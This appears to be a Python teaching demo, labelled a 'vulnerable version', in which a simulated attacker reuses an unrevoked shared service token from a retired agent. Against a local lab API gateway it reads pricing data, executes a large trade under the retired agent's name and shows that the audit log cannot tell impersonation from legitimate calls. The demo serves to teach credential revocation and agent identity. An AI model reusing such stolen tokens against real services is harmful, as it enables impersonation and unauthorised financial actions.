"""
Attacker - VULNERABLE VERSION (ACRF-02 demo)

DataAgent was decommissioned 90 days ago.
But the shared token was never revoked.
Attacker found the token and uses it to call any API.
This is the contractor keycard that was never deactivated.
"""
import time

import requests

GATEWAY_URL = "http://api-gateway:8000"
STOLEN_TOKEN = "shared-service-token-acrf02-2026"

def show_legitimate_usage():
    print("=" * 70)
    print(" STEP 1: Legitimate agents working normally")
    print("=" * 70)
    print()

    r = requests.get(
        f"{GATEWAY_URL}/api/pricing",
        headers={"Authorization": f"Bearer {STOLEN_TOKEN}", "X-Agent-Id": "pricing-agent"},
        timeout=10
    )
    print(f"[PricingAgent] Gets pricing data: {r.status_code} {r.json()}")

    r = requests.post(
        f"{GATEWAY_URL}/api/execute-trade",
        headers={"Authorization": f"Bearer {STOLEN_TOKEN}", "X-Agent-Id": "trade-agent"},
        json={"ticker": "AAPL", "shares": 10, "action": "BUY"},
        timeout=10
    )
    print(f"[TradeAgent] Executes trade: {r.status_code} {r.json()}")
    print()

def show_attack():
    print("=" * 70)
    print(" STEP 2: DataAgent retired 90 days ago - token never revoked")
    print("=" * 70)
    print()
    print("[Attacker] Found token in old deployment config: shared-service-token-acrf02-2026")
    print("[Attacker] DataAgent was retired - but nobody revoked the token.")
    print("[Attacker] Trying to use it...")
    print()
    time.sleep(1)

    r = requests.get(
        f"{GATEWAY_URL}/api/pricing",
        headers={"Authorization": f"Bearer {STOLEN_TOKEN}", "X-Agent-Id": "data-agent-RETIRED"},
        timeout=10
    )
    print(f"[Attacker] Calls /api/pricing as retired DataAgent: {r.status_code}")
    print(f"[Attacker] Response: {r.json()}")
    print()

    r = requests.post(
        f"{GATEWAY_URL}/api/execute-trade",
        headers={"Authorization": f"Bearer {STOLEN_TOKEN}", "X-Agent-Id": "data-agent-RETIRED"},
        json={"ticker": "AAPL", "shares": 10000, "action": "SELL"},
        timeout=10
    )
    print(f"[Attacker] Calls /api/execute-trade as retired DataAgent: {r.status_code}")
    print(f"[Attacker] Response: {r.json()}")
    print()

    r = requests.get(f"{GATEWAY_URL}/audit", timeout=10)
    log = r.json()["log"]
    print("Audit log - can you tell which calls were legitimate?")
    for entry in log:
        print(f"  {entry['caller']:<30} {entry['endpoint']} token={entry['token']}")
    print()
    print("ATTACK SUCCEEDED")
    print("Retired DataAgent token used to call pricing AND execute trades.")
    print("Audit log shows caller name only - no cryptographic identity.")
    print("Anyone who knows the shared token can impersonate any agent.")

if __name__ == "__main__":
    time.sleep(5)
    show_legitimate_usage()
    time.sleep(1)
    show_attack()
